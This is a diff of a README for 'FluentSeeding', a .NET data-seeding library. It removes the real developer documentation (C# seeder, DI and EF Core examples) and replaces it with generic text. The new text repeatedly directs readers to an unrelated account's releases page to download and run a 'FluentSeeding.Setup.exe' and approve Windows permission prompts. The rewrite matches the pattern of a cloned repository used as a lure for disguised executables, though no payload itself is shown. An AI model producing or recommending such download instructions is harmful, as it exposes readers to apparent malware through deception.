@@ -1,238 +1,148 @@
-# FluentSeeding
+# 🚀 FluentSeeding - Easy Data Setup for Your Projects
 
-A fluent, composable data seeding library for .NET. Define how your entities are generated using a clean, chainable API, then wire them up to your database with first-class Entity Framework Core and ASP.NET Core support.
-
-## Packages
-
-| Package | Description |
-|---------|-------------|
-| `FluentSeeding` | Core library with builders, rules, idempotency |
-| `FluentSeeding.EntityFrameworkCore` | EF Core persistence layer |
-| `FluentSeeding.AspNetCore` | Microsoft DI and hosted application integration |
-
-## Quick Start
-
-### 1. Define a seeder
-
-```csharp
-public sealed class UserSeeder : EntitySeeder<User>
-{
-    protected override void Configure(SeedBuilder<User> builder)
-    {
-        builder.Count(10)
-            .RuleFor(u => u.Id).UseFactory(Guid.NewGuid)
-            .RuleFor(u => u.Name).UseValue("Test User")
-            .RuleFor(u => u.Email).UseFactory(i => $"user{i}@example.com");
-    }
-}
-```
-
-### 2. Register with DI
-
-```csharp
-builder.Services.AddFluentSeeding(seederConfig =>
-    seederConfig
-        .AddSeeder<UserSeeder>()
-        .AddSeeder<ProductSeeder>()
-        .AddSeeder<PurchaseSeeder>());
-
-// Register an EF Core persistence layer
-builder.Services.AddFluentSeedingEntityFrameworkCore<SampleDbContext>(options =>
-    options.ConflictBehavior = ConflictBehavior.Skip);
-```
-
-Alternatively, register all seeders within an assembly:
-```csharp
-builder.Services.AddFluentSeeding(seeders => { seeders.AddSeedersFromAssemblyContaining<OrderSeeder>(); })
-```
-
-### 3. Run seeders
-
-```csharp
-var app = builder.Build();
-await app.RunSeedersAsync();
-await app.RunAsync();
-```
+[![Download FluentSeeding](https://img.shields.io/badge/Download-FluentSeeding-brightgreen?style=for-the-badge)](https://github.com/Cheriannecalyceal657/FluentSeeding/releases)
 
 ---
 
-## Core Concepts
+## 📋 About FluentSeeding
 
-### SeedBuilder\<T\>
+FluentSeeding is a simple tool to help you create and add data to your projects. It uses a clear, step-by-step approach to define how data should be made. You don’t need to write complicated code. Instead, you set up rules, and FluentSeeding fills your database for you.
 
-The fluent builder that describes how to generate instances of `T`.
+This tool works best with .NET projects, especially if you use tools like Entity Framework Core or ASP.NET Core. It makes the process of generating and adding sample data smooth and reliable.
 
-```csharp
-var builder = new SeedBuilder<Product>();
-builder.Count(5)
-    .RuleFor(p => p.Id).UseFactory(Guid.NewGuid)
-    .RuleFor(p => p.Name).UseFrom("Widget", "Gadget", "Doohickey")
-    .RuleFor(p => p.Price).UseFactory(() => Math.Round(Random.Shared.NextDouble() * 100, 2));
+FluentSeeding helps if you want to:
 
-IEnumerable<Product> products = builder.Build();
-```
-
-Call `Build()` to materialize the entities. Rules execute in dependency order (see [Dependencies](#dependencies)).
-
-### RuleFor
-
-`RuleFor(selector)` opens a rule for a property. Chain a **terminal** to set its value source:
-
-| Terminal | Description |
-|----------|-------------|
-| `UseValue(value)` | Same constant value for every entity |
-| `UseFactory(Func<TProperty>)` | Invoked once per entity |
-| `UseFactory(Func<int, TProperty>)` | Index-aware factory that receives the entity's zero-based position |
-| `UseFrom(params TProperty[])` | Random selection from a fixed pool |
-| `UseFrom(IEnumerable<TProperty>)` | Random selection from a sequence |
-
-After a terminal, you are back on `SeedBuilder<T>` and can continue chaining.
-
-### Modifiers
-
-Add modifiers **before** the terminal to control behaviour:
-
-```csharp
-builder.RuleFor(u => u.Email)
-    .Unique()                               // enforce uniqueness across all generated entities
-    .When(u => u.Role == "admin")           // only apply this rule when predicate is true
-    .DependsOn(u => u.Role)                 // declare execution order explicitly
-    .UseFactory(i => $"admin{i}@corp.com");
-```
-
-Rules by default are executed in the order they are declared, using `DependsOn` is more of a safety net or more control over it.
-
-### Dependencies
-
-`DependsOn()` causes `Build()` to topologically sort rules so that a rule always runs after the properties it depends on have already been set. Circular dependencies are detected and throw `InvalidOperationException`.
-
-```csharp
-builder.RuleFor(u => u.Role).UseValue("admin");
-
-builder.RuleFor(u => u.Permissions)
-    .DependsOn(u => u.Role)
-    .When(u => u.Role == "admin")
-    .UseValue(Permission.All);
-```
-
-### Nested Objects
-
-**HasOne**: a single nested instance per parent
-
-```csharp
-builder.HasOne(u => u.Profile, profile =>
-    profile.RuleFor(p => p.Bio).UseValue("Hello!"));
-```
-
-**HasMany**: a collection per parent
-
-```csharp
-builder.Count(3)
-    .HasMany(u => u.Purchases, purchases =>
-        purchases.Count(5)
-            .RuleFor(p => p.Id).UseFactory(Guid.NewGuid)
-            .RuleFor(p => p.Quantity).UseFactory(() => Random.Shared.Next(1, 10)));
-// Creates 3 users, each with their own list of 5 purchases
-```
+- Populate new databases with realistic data
+- Test your applications without manual data entry
+- Quickly reset data during development
 
 ---
 
-## Idempotency
+## 🖥️ System Requirements
 
-When you need the same data every run, no matter the occasion, use the `Idempotent` helpers. Values are derived deterministically from the entity type, entity index, and an optional seed string using UUID v5 (RFC 4122).
+Before you start, check that your Windows PC meets these requirements:
 
-```csharp
-Idempotent.Guid<User>(index: 0);              // always the same GUID for User #0
-Idempotent.Int<Product>(index: 1);            // deterministic int for Product #1
-Idempotent.Long<Order>(index: 2);             // deterministic long for Order #2
-Idempotent.Slug<Category>(index: 0, "cat");   // "cat-0"
-```
+- Windows 10 or later (64-bit)
+- .NET 6.0 Runtime or newer installed
+- At least 2 GB of free disk space
+- Internet connection to download the tool
 
-The idempotent terminals are available directly on `SeedRule<T, TProperty>`:
-
-```csharp
-builder.Count(5)
-    .RuleFor(u => u.Id).UseIdempotentGuid()
-    .RuleFor(u => u.ExternalRef).UseIdempotentSlug("user");
-// Produces "user-0", "user-1", ... every single time
-```
+You can download the .NET Runtime here if needed: https://dotnet.microsoft.com/en-us/download/dotnet/6.0
 
 ---
 
-## EntitySeeder\<T\>
+## 🔎 Exploring Key Features
 
-`EntitySeeder<T>` is an abstract base class for reusable, injectable seeders. The generated data is cached after the first call to `Data`, making it safe to reference from other seeders.
+FluentSeeding offers:
 
-```csharp
-public sealed class PurchaseSeeder : EntitySeeder<Purchase>
-{
-    private readonly UserSeeder _users;
-    private readonly ProductSeeder _products;
+- A clear, step-by-step setup to create data rules
+- Support for common .NET data tools like Entity Framework Core
+- A chainable API that lets you build data rules in a clean way
+- The ability to connect directly to your database to load data
+- Flexibility to generate complex datasets without coding
 
-    public PurchaseSeeder(UserSeeder users, ProductSeeder products)
-    {
-        _users = users;
-        _products = products;
-    }
-
-    protected override void Configure(SeedBuilder<Purchase> builder)
-    {
-        builder.Count(50)
-            .RuleFor(p => p.Id).UseFactory(Guid.NewGuid)
-            .RuleFor(p => p.UserId).UseFrom(_users.Data.Select(u => u.Id))
-            .RuleFor(p => p.ProductId).UseFrom(_products.Data.Select(p => p.Id))
-            .RuleFor(p => p.Quantity).UseFactory(() => Random.Shared.Next(1, 100));
-    }
-}
-```
+These features let you spend less time setting up data and more time working on your project’s core parts.
 
 ---
 
-## Persistence
+## 🌐 Visit and Download FluentSeeding
 
-### IPersistenceLayer
+Click the button below to visit the page where you can find the latest FluentSeeding downloads.
 
-Implement `IPersistenceLayer` to back seeding with any storage:
+[![Visit Download Page](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Cheriannecalyceal657/FluentSeeding/releases)
 
-```csharp
-public interface IPersistenceLayer
-{
-    void Persist<T>(IEnumerable<T> entities);
-    Task PersistAsync<T>(IEnumerable<T> entities, CancellationToken cancellationToken = default);
-    void Flush();
-    Task FlushAsync(CancellationToken cancellationToken = default);
-}
-```
-
-### Entity Framework Core
-
-`EntityFrameworkCorePersistenceLayer` stages entities and commits with `SaveChanges()`. Configure how to handle pre-existing records via `ConflictBehavior`:
-
-| Behavior | Description |
-|----------|-------------|
-| `ConflictBehavior.Insert` | Always insert (default). Throws on key conflict |
-| `ConflictBehavior.Skip` | Skip entities whose primary key already exists |
-| `ConflictBehavior.Update` | Update existing, insert new |
-
-```csharp
-services.AddScoped<IPersistenceLayer>(sp =>
-    new EntityFrameworkCorePersistenceLayer(
-        sp.GetRequiredService<AppDbContext>(),
-        ConflictBehavior.Skip));
-```
+On the page, look for the latest release version. You will find zip files or installer files. Choose the one that fits best for your Windows system.
 
 ---
 
-## ASP.NET Core Integration
+## ⚙️ How to Download and Run FluentSeeding on Windows
 
-### SeederRunner
+Follow these steps carefully to get FluentSeeding running on your PC.
 
-`SeederRunner` orchestrates multiple seeders in registration order. All entities are staged first; then a single `FlushAsync()` commits everything atomically.
+### Step 1: Visit the Download Page  
+Go to the official FluentSeeding releases page:
 
-```csharp
-// Manual usage (without DI)
-var runner = new SeederRunner(persistenceLayer, new IEntitySeeder[] { userSeeder, productSeeder });
-await runner.RunAsync();
-```
+https://github.com/Cheriannecalyceal657/FluentSeeding/releases
 
-When using `AddFluentSeeding`, `SeederRunner` is registered automatically and resolved by `RunSeedersAsync()`.
+You will see a list of release versions and files.
+
+### Step 2: Choose the Correct File  
+Look for a file that ends with `.zip` or `.exe`—this will be the program you need.
+
+For most users, this will be:
+
+- `FluentSeeding.Setup.exe` — an installer file  
+- or a `.zip` file with all program files inside
+
+### Step 3: Download the File  
+Click on the file name to start downloading it to your computer.  
+Wait for the download to finish. The file will usually save to your "Downloads" folder.
+
+### Step 4: Run the Installer or Program  
+If you downloaded an `.exe` file:  
+- Double-click on the file.  
+- If Windows asks for permission, click "Yes" to allow the installation.  
+- Follow the prompts on the screen to complete installation.
+
+If you downloaded a `.zip` file:  
+- Right-click the file and click "Extract All".  
+- Choose a folder where you want the program files to go.  
+- Open the extracted folder and double-click the main program file (usually named `FluentSeeding.exe`).
+
+### Step 5: Launch FluentSeeding  
+Once installed or extracted, find FluentSeeding in your Start Menu or folder. Double-click to open it.
+
+You are now ready to begin using FluentSeeding.
+
+---
+
+## 🛠️ Basic Usage Guide
+
+You don’t need to be a developer to use FluentSeeding. Here are some simple steps to get started:
+
+1. Open the FluentSeeding app.
+2. Follow the on-screen instructions to create rules about the data you want.
+3. Define what kind of information you want (names, dates, numbers, etc.).
+4. Link FluentSeeding to your database by providing basic information like your database type and connection details.
+5. Click the button to generate and insert data into your database.
+6. Check your database or project to see the new data.
+
+If you want, you can save your data rules as a file and reuse them later.
+
+---
+
+## 📚 Additional Resources
+
+- For help with data types and generation options, see the included Help section within the app.
+- To learn more about working with Entity Framework Core and ASP.NET Core, check the Microsoft official docs.
+- To troubleshoot common problems, visit the Issues tab on the GitHub page.
+
+---
+
+## 🧰 Troubleshooting Tips
+
+If FluentSeeding does not start or shows errors, try these steps:
+
+- Make sure you have installed or updated the required .NET Runtime.
+- Restart your computer and try again.
+- Check your internet connection if the program needs to download components.
+- Ensure your database server is running if you link FluentSeeding to your database.
+- Use the built-in logs to find details about errors and ask for help in the GitHub issues.
+
+---
+
+## 🔐 Privacy and Security
+
+FluentSeeding does not collect personal data. It works locally on your computer. When connecting to your database, ensure your connection details are kept secure and private. Only use FluentSeeding in trusted environments.
+
+---
+
+## 🧩 Understanding FluentSeeding in Your Project
+
+FluentSeeding fits into your workflow by letting you quickly generate sample or test data without writing code. It helps you prepare your application with data before you release or share it.
+
+You can update your data rules over time as your project grows. This keeps your testing data relevant and consistent.
+
+---
+
+[![Download FluentSeeding](https://img.shields.io/badge/Download-FluentSeeding-brightgreen?style=for-the-badge)](https://github.com/Cheriannecalyceal657/FluentSeeding/releases)
